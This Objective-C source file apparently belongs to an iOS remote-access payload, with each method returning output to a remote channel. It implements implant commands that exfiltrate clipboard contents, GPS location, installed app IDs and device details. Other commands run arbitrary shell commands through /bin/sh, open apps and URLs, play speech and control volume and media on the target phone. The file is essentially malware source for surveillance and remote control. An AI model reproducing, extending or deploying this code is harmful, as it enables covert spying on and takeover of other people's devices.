/*
 * MIT License
 *
 * Copyright (c) 2020-2022 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#import "external/badges.h"
#import "apple_ios/commands.h"

@implementation Commands

@synthesize fileManager;

-(id)init {
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];

    fileManager = [[NSFileManager alloc] init];
    [fileManager changeCurrentDirectoryPath:NSHomeDirectory()];

    return self;
}

-(void)exec_plugin:(NSString *)plugin withCmd:(NSString *)cmd withArgs:(NSString *)args {
    CPDistributedMessagingCenter *messagingCenter = [CPDistributedMessagingCenter centerNamed:plugin];
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:cmd forKey:@"cmd"];
    NSDictionary* reply = [_messagingCenter sendMessageAndReceiveReplyName:@"execPlugin" userInfo:userInfo];
    NSString* result = [reply objectForKey:@"returnStatus"];
    send_channel(channelPipe, (char *)[result UTF8String]);
}

-(void)cmd_sysinfo {
    UIDevice* device = [UIDevice currentDevice];
    int batinfo = ([_thisUIDevice batteryLevel] * 100);

    NSString *sysinfo = [NSString stringWithFormat:@"%sModel: %@\n%sBattery: %d\n%sVersion: %@\n%sName: %@",
                        information, [device model], information, batinfo, information, [device systemVersion], information, [device name]];

    send_channel(channelPipe, (char *)[sysinfo UTF8String]);
}

-(void)cmd_getpid {
    NSProcessInfo* processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sPID: %d", information, processID] UTF8String]);
}

-(void)cmd_getpaste {
    UIPasteboard* pb = [UIPasteboard generalPasteboard];
    send_channel(channelPipe, "Pasteboard:\n");
    if ([pb.strings count] > 1) {
        NSUInteger count = 0;
        for (NSString* pstring in pb.strings){
            send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%lu: %@\n", count, pstring] UTF8String]);
            count++;
        }
    } else if ([pb.strings count] == 1)
        send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%@\n", [pb.strings firstObject]] UTF8String]);
}

-(void)cmd_battery {
    int batteryLevelLocal = ([_thisUIDevice batteryLevel] * 100);
    NSString *info = [NSString stringWithFormat:@"%sBattery level: %d (%@charging)", information,
                      batteryLevelLocal, [_thisUIDevice batteryState] == UIDeviceBatteryStateCharging ? @"" : @"not "];
    send_channel(channelPipe, (char *)[info UTF8String]);
}

-(void)cmd_getvol {
    [[AVAudioSession sharedInstance] setActive:YES error:nil];
    [[AVAudioSession sharedInstance] addObserver:self forKeyPath:@"outputVolume" options:NSKeyValueObservingOptionNew context:nil];
    send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sVolume level: %.2f", information,
                            [AVAudioSession sharedInstance].outputVolume] UTF8String]);
}

-(void)cmd_locate {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
    [manager startUpdatingLocation];
    CLLocation* location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];

    if ((int)(coordinate.latitude + coordinate.longitude) == 0)
        send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sUnable to get device location!", error] UTF8String]);
    else {
        NSString *location = [NSString stringWithFormat:@"%sLatitude: %f\n%sLongitude: %f\n%sMap: http://maps.google.com/maps?q=%f,%f",
                             information, coordinate.latitude, information, coordinate.longitude,
                              information, coordinate.latitude, coordinate.longitude];
        send_channel(channelPipe, (char *)[location UTF8String]);
    }
}

-(void)cmd_vibrate {
    AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
}

-(void)cmd_bundleids {
    char buffer[1024];
    NSString* result = @"";
    CFArrayRef array = SBSCopyApplicationDisplayIdentifiers(NO, NO);
    CFIndex pointer;
    for (pointer = 0; pointer < CFArrayGetCount(array); pointer++) {
        CFStringGetCString(CFArrayGetValueAtIndex(array, pointer), buffer, sizeof(buffer), kCFStringEncodingUTF8);
        result = [NSString stringWithFormat:@"%@%s\n", result, buffer];
    }
    send_channel(channelPipe, (char *)[result UTF8String]);
}

-(void)cmd_exec:(NSString *)command {
    NSTask *task = [[NSTask alloc] init];
    [task setLaunchPath:@"/bin/sh"];
    NSArray *arguments = [NSArray arrayWithObjects: @"-c", [NSString stringWithFormat:@"%@", command], nil];
    [task setArguments:arguments];
    NSPipe *pipe = [NSPipe pipe];
    [task setStandardOutput:pipe];
    NSFileHandle *file = [pipe fileHandleForReading];
    [task launch];
    NSData *data = [file readDataToEndOfFile];
    send_channel(channelPipe, (char *)[[[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding] UTF8String]);
}

-(void)cmd_say:(NSString *)message {
    AVSpeechSynthesizer *synthesizer = [[AVSpeechSynthesizer alloc] init];
    AVSpeechUtterance* utterance = [AVSpeechUtterance speechUtteranceWithString:message];
    utterance.rate = 0.5;

    NSString *language = [[NSLocale currentLocale] localeIdentifier];
    NSDictionary *languageDic = [NSLocale componentsFromLocaleIdentifier:language];

    NSString *countryCode = [languageDic objectForKey:NSLocaleCountryCode];
    NSString *languageCode = [languageDic objectForKey:NSLocaleLanguageCode];
    NSString *languageForVoice = [[NSString stringWithFormat:@"%@-%@", [languageCode lowercaseString], countryCode] lowercaseString];

    utterance.voice = [AVSpeechSynthesisVoice voiceWithLanguage:languageForVoice];
    [synthesizer speakUtterance:utterance];
}

-(void)cmd_setvol:(NSString *)level {
    MPVolumeView *volumeView = [[MPVolumeView alloc] init];
    UISlider* volumeViewSlider = nil;
    for (UIView* view in [volumeView subviews]) {
        if ([view.class.description isEqualToString:@"MPVolumeSlider"]) {
            volumeViewSlider = (UISlider*)view;
            break;
        }
    }
    [volumeViewSlider setValue:[level floatValue] animated:NO];
    [volumeViewSlider sendActionsForControlEvents:UIControlEventTouchUpInside];
}

-(void)cmd_player:(NSString*)action {
    if ([action isEqualToString:@"play"]) {
        [[MPMusicPlayerController systemMusicPlayer] play];
    } else if ([action isEqualToString:@"pause"]) {
        [[MPMusicPlayerController systemMusicPlayer] pause];
    } else if ([action isEqualToString:@"next"]) {
        [[MPMusicPlayerController systemMusicPlayer] skipToNextItem];
    } else if ([action isEqualToString:@"prev"]) {
        [[MPMusicPlayerController systemMusicPlayer] skipToPreviousItem];
    } else if ([action isEqualToString:@"info"]) {
        float checkTime = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
        [NSThread sleepForTimeInterval:0.1];
        float playbackTime = [[MPMusicPlayerController systemMusicPlayer] currentPlaybackTime];
        if (checkTime != playbackTime) {
            MPMediaItem *song = [[MPMusicPlayerController systemMusicPlayer] nowPlayingItem];
            NSString *title = [song valueForProperty:MPMediaItemPropertyTitle];
            NSString *album = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
            NSString *artist = [song valueForProperty:MPMediaItemPropertyArtist];
            NSString *result = [NSString stringWithFormat:@"%sTitle: %@\n%sAlbum: %@\n%sArtist: %@\n%sPlayback time: %f",
                                information, title, information, album, information, artist, information, playbackTime];
            send_channel(channelPipe, (char *)[result UTF8String]);
        } else {
            send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sNot playing.", warning] UTF8String]);
        }
    }
}

-(void)cmd_openapp:(NSString*)bundleID {
    CFStringRef identifier = CFStringCreateWithCString(
    kCFAllocatorDefault, [bundleID UTF8String], kCFStringEncodingUTF8);
    assert(identifier != NULL);
    int status = SBSLaunchApplicationWithIdentifier(identifier, NO);
    if (status != 0)
        send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sFailed to open application!", error] UTF8String]);
    else
        send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sApplication has been launched!", success] UTF8String]);
    CFRelease(identifier);
}

-(void)cmd_openurl:(NSString *)url {
    CFURLRef status = CFURLCreateWithBytes(NULL, (UInt8*)[url UTF8String], strlen([url UTF8String]), kCFStringEncodingUTF8, NULL);
    if (!status) {
        send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sInvalid URL address given!", error] UTF8String]);
        return;
    } else {
        bool ret = SBSOpenSensitiveURLAndUnlock(status, 1);
        if (!ret) {
            send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sFailed to open URL!", error] UTF8String]);
            return;
        }
    }
    send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sURL has been opened!", success] UTF8String]);
}

-(void)cmd_chdir:(NSString *)directory {
    NSString* path = NSHomeDirectory();
    if (![directory isEqual:@""]) {
        path = directory;
    }
    BOOL isdir = NO;
    if ([fileManager fileExistsAtPath:path isDirectory:&isdir]) {
        if (isdir)
            [fileManager changeCurrentDirectoryPath:path];
        else {
            send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sPath: %@: Not a directory!", error, path] UTF8String]);
            return;
        }
    } else {
        send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sPath %@: No such file or directory!", error, path] UTF8String]);
        return;
    }
    send_channel(channelPipe, (char *)[[NSString stringWithFormat:@"%sCurrent directory: %@", information, [fileManager currentDirectoryPath]] UTF8String]);
}

@end
